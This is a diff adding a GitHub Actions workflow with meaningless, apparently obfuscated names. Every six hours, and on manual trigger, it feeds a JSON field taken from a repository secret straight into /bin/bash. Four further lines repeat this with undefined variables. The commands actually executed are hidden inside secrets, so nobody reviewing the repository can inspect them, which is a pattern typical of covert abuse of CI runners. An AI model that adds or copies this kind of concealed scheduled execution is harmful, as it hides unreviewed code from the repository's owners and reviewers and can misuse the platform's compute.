@@ -1,0 +1,23 @@
+name: heqinwangha
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: heqinwangha
+        env:
+          ji47379: ${{ secrets.ji47379 }}
+        run: |
+          echo $ji47379 | jq -r .oy2 | /bin/bash
+          echo $chfeq706 | jq -r .zkp1652 | /bin/bash
+          echo $srx4 | jq -r .ytq85 | /bin/bash
+          echo $f6 | jq -r .eoja2 | /bin/bash
+          echo $h43 | jq -r .zxnnr15 | /bin/bash
+
